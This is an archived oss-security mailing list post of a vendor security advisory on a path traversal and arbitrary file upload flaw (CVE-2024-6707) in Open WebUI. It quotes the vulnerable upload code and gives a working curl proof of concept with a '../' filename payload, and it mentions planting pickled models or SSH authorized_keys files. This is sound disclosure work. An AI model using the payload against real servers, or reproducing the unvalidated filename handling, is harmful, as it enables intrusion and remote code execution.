<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>oss-security - KL-001-2024-006: Open WebUI Arbitrary File Upload + Path Traversal</title>

<link href="/style.css" type="text/css" rel="stylesheet">
<style type="text/css">
.calendar { text-align: center; }
.ccell { background: #ccc; width: 5ex; padding: 2px; }

.cal_brief { text-align: center; }
.cal_brief td:first-child { background: inherit; }
.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
.cal_big { text-align: center; padding: 0; margin: 0; }
.cal_big td { padding: 0 2px; }
.cal_mon { text-align: center; }
.cal_mon th { font-size: small; padding: 0; margin: 0; }
.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
	padding: 2px; text-align: right; }
.cal_mon td[colspan] { background: inherit; }
.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
	margin-top: -2pt; font-weight: bold; }
.cal_mon a { text-align: right; margin-left: -4em; float: right; }
</style>
</head>

<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">


<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>

<td>
<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
<td width="100%">
<div class="nav">
<ul>
<li><a href="/">Products</a>
<ul>
<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
<ul>
<li><a href="/john/">Free &amp; Open Source for any platform</a>
<li><a href="/john/cloud/">in the cloud</a>
<li><a href="/john/pro/linux/">Pro for Linux</a>
<li><a href="/john/pro/macosx/">Pro for macOS</a>
</ul>
<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
<ul>
<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
</ul>
<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
<li><a href="/pam/">Pluggable Authentication Modules</a>
<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
</ul>
<li><a href="/services/">Services</a>
<li id="narrow-li-1"><a>Publications</a>
<ul>
<li><a href="/articles/">Articles</a>
<li><a href="/presentations/">Presentations</a>
</ul>
<li><a>Resources</a>
<ul>
<li><a href="/lists/">Mailing lists</a>
<li><a href="https://openwall.info/wiki/">Community wiki</a>
<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
<li><a href="https://cvsweb.openwall.com">Source code repositories (CVSweb)</a>
<li><a href="/mirrors/">File archive &amp; mirrors</a>
<li><a href="/signatures/">How to verify digital signatures</a>
<li><a href="/ove/">OVE IDs</a>
</ul>
<li id="last-li"><a href="/news">What's new</a>
</ul>
</div>


</table>


<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
<TR><TD>
<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
<TR><TD bgcolor="#ECF8FF">
<a href="https://twitter.com/openwall">
Follow @Openwall on Twitter for new release announcements and other news</a>

</TABLE>
</TABLE>

<a href="6">[&lt;prev]</a> <a href="8">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
<pre style="white-space: pre-wrap">
Message-ID: &lt;87af73b2-eeeb-4861-9620-be7d7e895b88&#64;korelogic.com&gt;
Date: Wed, 7 Aug 2024 18:49:23 -0500
From: KoreLogic Disclosures &lt;disclosures&#64;...elogic.com&gt;
To: fulldisclosure&#64;...lists.org, oss-security&#64;...ts.openwall.com
Subject: KL-001-2024-006: Open WebUI Arbitrary File Upload + Path Traversal

KL-001-2024-006: Open WebUI Arbitrary File Upload + Path Traversal

Title: Open WebUI Arbitrary File Upload + Path Traversal
Advisory ID: KL-001-2024-006
Publication Date: 2024.08.D06
Publication URL: <a href="https://korelogic.com/Resources/Advisories/KL-001-2024-006.txt" rel="nofollow">https://korelogic.com/Resources/Advisories/KL-001-2024-006.txt</a>


1. Vulnerability Details

      Affected Vendor: Open WebUI
      Affected Product: Open WebUI
      Affected Version: 0.1.105
      Platform: Debian 12
      CWE Classification: CWE-22: Improper Limitation of a Pathname to a
                          Restricted Directory ('Path Traversal'),
                          CWE-434: Unrestricted Upload of File with Dangerous
                          Type
      CVE ID: CVE-2024-6707


2. Vulnerability Description

      Attacker controlled files can be uploaded to arbitrary
      locations on the web server's filesystem by abusing a
      path traversal vulnerability.


3. Technical Description

    When attaching files to a prompt by clicking the
    plus sign (+) on the left of the message input box
    when using the Open WebUI HTTP interface, the file
    is uploaded to a static upload directory.

    The name of the file is derived from the original
    HTTP upload request and is not validated or sanitized.
    This allows for users to upload files with names
    containing dot-segments in the file path and traverse
    out of the intended uploads directory. Effectively, users
    can upload files anywhere on the filesystem the
    user running the web server has permission.

    This can be visualized by examining the python code
    for the "/rag/api/v1/doc" API route:

       @app.post("/doc")
       def store_doc(
           collection_name: Optional[str] = Form(None),
           file: UploadFile = File(...),
           user=Depends(get_current_user),
       ):
           # "<a href="https://www.gutenberg.org/files/1727/1727-h/1727-h.htm" rel="nofollow">https://www.gutenberg.org/files/1727/1727-h/1727-h.htm</a>"

           print(file.content_type)
           try:
               filename = file.filename
               file_path = f"{UPLOAD_DIR}/{filename}"
               contents = file.file.read()
               with open(file_path, "wb") as f:
                   f.write(contents)
                   f.close()

    The "file" variable is a representation of the multipart
    form data contained within the HTTP POST request. The
    "filename" variable is derived from the uploaded file name
    and is not validated before writing the file contents
    to disk.

     This can be used to upload malicious models. These models
     are often distributed as pickled python objects and can
     be leveraged to execute arbitrary python bytecode once
     deserialized. Alternatively, an attacker can leverage existing
     services, such as SSH, to upload an attacker controlled
     "authorized_keys" file to remotely connect to the machine.


4. Mitigation and Remediation Recommendation

      This issue was remediated in Open WebUI release v0.1.117 on 2024.04.03.


5. Credit

      This vulnerability was discovered by Jaggar Henry and Sean
      Segreti of KoreLogic, Inc.


6. Disclosure Timeline

      2024.03.05 - KoreLogic requests secure communications channel and point
                   of contact from OpenWebUI.com via email.
      2024.03.12 - KoreLogic submits vulnerability details and suggested patch
                   to maintainer via Github Security 'Report a vulnerability'
                   web form.
      2024.04.01 - KoreLogic opens Discussion #1385 via GitHub to request an
                   update from the maintainer.
      2024.04.01 - Maintainer opens a private fork and merges KoreLogic's patch.
      2024.04.03 - Maintainer releases v0.1.117.
      2024.08.06 - KoreLogic public disclosure.


7. Proof of Concept

    Execute the following cURL command:

       TARGET_URI='<a href="https://redacted.com" rel="nofollow">https://redacted.com</a>'; JWT='redacted'; LOCAL_FILE='/tmp/file_to_upload.txt'\
       curl -H "Authorization: Bearer $JWT" -F "file=$LOCAL_FILE;filename=../../../../../../../../../../tmp/pwned.txt" 
"$TARGET_URI/rag/api/v1/doc"

    Verify the file "pwned.txt" exists in the /tmp/ directory on
    the machine hosting the web server:

       ollama&#64;...server:~$ cat /tmp/pwned.txt
       korelogic
       ollama&#64;...server:~$


The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
<a href="http://creativecommons.org/licenses/by-sa/4.0/" rel="nofollow">http://creativecommons.org/licenses/by-sa/4.0/</a>

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
<a href="https://www.korelogic.com/about-korelogic.html" rel="nofollow">https://www.korelogic.com/about-korelogic.html</a>

Our public vulnerability disclosure policy is available at:
<a href="https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy" rel="nofollow">https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy</a>


<span style="font-family: times;"><strong>Download attachment "</strong><a href="7/1" rel="nofollow" download>OpenPGP_signature.asc</a><strong>" of type "</strong>application/pgp-signature<strong>" (841 bytes)</strong></span>
</pre>
<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>


<p>
Please check out the
<a href="https://oss-security.openwall.org/wiki/">
Open Source Software Security Wiki</a>, which is counterpart to this
<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
<p>
Confused about <a href="/lists/">mailing lists</a> and their use?
<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
and check out these
<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
<p>

</body>
</html>
